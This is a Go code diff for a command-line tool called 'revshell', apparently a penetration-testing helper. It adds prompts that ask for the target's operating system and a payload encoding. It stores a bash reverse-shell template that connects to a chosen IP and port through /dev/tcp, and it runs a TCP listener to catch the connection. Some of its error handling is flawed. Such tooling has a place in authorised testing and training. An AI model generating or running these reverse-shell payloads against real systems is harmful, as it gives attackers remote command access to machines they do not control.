@@ -24,6 +24,75 @@ type tunnelAddress struct {
 	ip    string
 }
 
+type TargetOS string
+
+const (
+	TargetOsLinux   TargetOS = "linux"
+	TargetOsWindows TargetOS = "windows"
+	TargetOsMacOS   TargetOS = "macos"
+	TargetUnknown   TargetOS = "unknown"
+)
+
+var targetOSValues = []TargetOS{
+	TargetOsLinux,
+	TargetOsWindows,
+	TargetOsMacOS,
+	TargetUnknown,
+}
+
+func targetOSLabel(targetOS TargetOS) string {
+	switch targetOS {
+	case TargetOsLinux:
+		return "Linux"
+	case TargetOsWindows:
+		return "Windows"
+	case TargetOsMacOS:
+		return "macOS"
+	case TargetUnknown:
+		return "I don't know"
+	default:
+		return string(targetOS)
+	}
+}
+
+type Encoding string
+
+const (
+	EncodingBase64           Encoding = "base64"
+	EncodingNone             Encoding = "none"
+	EncodingUrl              Encoding = "url"
+	EncodingPowerShellBase64 Encoding = "powershell-base64"
+)
+
+var encodingValues = []Encoding{
+	EncodingBase64,
+	EncodingNone,
+	EncodingUrl,
+	EncodingPowerShellBase64,
+}
+
+func targetEncodingLabels(encoding Encoding) string {
+	switch encoding {
+	case EncodingBase64:
+		return "Base64 encoding"
+	case EncodingNone:
+		return "No encoding"
+	case EncodingUrl:
+		return "URL encoding"
+	case EncodingPowerShellBase64:
+		return "Powershell Base64 encoding"
+	default:
+		return string(encoding)
+	}
+}
+
+type ShellCandidate struct {
+	Name     string
+	OS       TargetOS
+	Encoding Encoding
+	Template string
+}
+
 func selectTunnelAddress() (string, error) {
 	interfaces, err := net.Interfaces()
 	if err != nil {
@@ -138,6 +207,74 @@ func isTunnelInterface(name string) bool {
 	return false
 }
 
+func queryReverseShellCommandsToOffer() (ShellCandidate, error) {
+	options := make(
+		[]huh.Option[TargetOS],
+		0,
+		len(targetOSValues),
+	)
+	options2 := make(
+		[]huh.Option[Encoding],
+		0,
+		len(encodingValues),
+	)
+
+	for _, targetOS := range targetOSValues {
+		options = append(
+			options,
+			huh.NewOption(
+				targetOSLabel(targetOS),
+				targetOS,
+			),
+		)
+	}
+
+	for _, encoding := range encodingValues {
+		options2 = append(
+			options2,
+			huh.NewOption(
+				targetEncodingLabels(encoding),
+				encoding,
+			),
+		)
+	}
+
+	var selectedOS TargetOS
+	var selectedEncoding Encoding
+
+	err := huh.NewSelect[TargetOS]().
+		Title("What OS is the target running?").
+		Options(options...).
+		Value(&selectedOS).
+		Run()
+	if err != nil {
+		fmt.Printf(
+			"select target OS: %w",
+			options,
+		)
+	}
+
+	err2 := huh.NewSelect[Encoding]().
+		Title("What encoding do you require?").
+		Options(options2...).
+		Value(&selectedEncoding).
+		Run()
+	if err2 != nil {
+		fmt.Printf(
+			"select target OS: %w",
+			options2,
+		)
+	}
+
+	candidate := ShellCandidate{
+		Name:     "ReverseBash",
+		OS:       selectedOS, // Replace with your actual TargetS value/enum
+		Encoding: selectedEncoding,
+		Template: "bash -i >& /dev/tcp/{{.IP}}/{{.Port}} 0>&1",
+	}
+	return candidate, nil
+}
+
 // rootCmd represents the base command when called without any subcommands
 var rootCmd = &cobra.Command{
 	Use:   "revshell",
@@ -163,13 +300,16 @@ var rootCmd = &cobra.Command{
 			selectedPort,
 		)
 
-		establishReversShellListener(selectedPort)
+		shellCandidate, err := queryReverseShellCommandsToOffer()
+		fmt.Println(shellCandidate)
+
+		establishReverseShellListener(selectedPort)
 
 		return nil
 	},
 }
 
-func establishReversShellListener(port string) error {
+func establishReverseShellListener(port string) error {
 	listener, err := net.Listen("tcp", ":"+port)
 	if err != nil {
 		return fmt.Errorf("listen on port %s: %w", port, err)
